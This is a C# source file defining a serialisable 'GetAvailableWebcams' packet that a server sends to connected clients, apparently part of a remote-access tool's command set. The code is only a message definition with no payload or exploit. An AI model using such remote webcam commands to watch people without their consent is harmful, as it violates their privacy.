using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetAvailableWebcams : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetAvailableWebcams;
            }
        }

        public GetAvailableWebcams()
        {
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
